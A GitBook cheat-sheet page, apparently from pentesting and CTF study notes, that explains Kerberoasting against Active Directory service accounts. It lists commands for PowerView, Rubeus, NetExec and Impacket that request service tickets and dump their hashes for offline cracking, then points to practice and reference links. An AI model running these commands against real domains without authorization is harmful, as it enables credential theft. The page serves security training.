---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Kerberoasting

## TL;DR

Kerberoasting is an attack to SPN accounts. SPNs are unique IDs that Kerberos uses to map a service instance to a service account in whose context, often privileged, the service is running. For obtaining the Service Ticket (ST) one of the following is needed:

1. An account's cleartext pass (or NTLM hash)
2. A shell in the context of a domain user account
3. `SYSTEM` level access on a domain-joined host

The ST (TGS-REP) (Figure 1) is encrypted with the service's account NTLM hash, so the plaintext password can potentially be cracked.

<figure><img src="../../../.gitbook/assets/kerberoasting_process.png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

## Windows

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
{% endtab %}

{% tab title="Rubeus" %}
```powershell
.\Rubeus.exe kerberoast
```
{% endtab %}
{% endtabs %}

## Linux

{% tabs %}
{% tab title="NetExec" %}
```bash
nxc ldap 192.168.0.104 -u user -p pass --kerberoasting output.txt
```
{% endtab %}

{% tab title="Impacket" %}
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN/user -request -outputfile spns.lst
```
{% endtab %}
{% endtabs %}

## Practice

{% tabs %}
{% tab title="Active (Easy)" %}
{% content-ref url="../../../boxes/easy/active.md" %}
[active.md](../../../boxes/easy/active.md)
{% endcontent-ref %}
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="Tim Medin's Lecture" %}
{% embed url="https://www.youtube.com/watch?v=Jaa2LmZaNeU" %}
{% endtab %}

{% tab title="Video Demo" %}
{% embed url="https://youtu.be/tRCvagjqx3c?t=158" %}
Video demonstration of Kerberoasting.
{% endembed %}
{% endtab %}

{% tab title="Kerberoasting in Detail" %}
{% embed url="https://adsecurity.org/?p=3458" %}
A great article detailing the Kerberoasting process.
{% endembed %}
{% endtab %}
{% endtabs %}
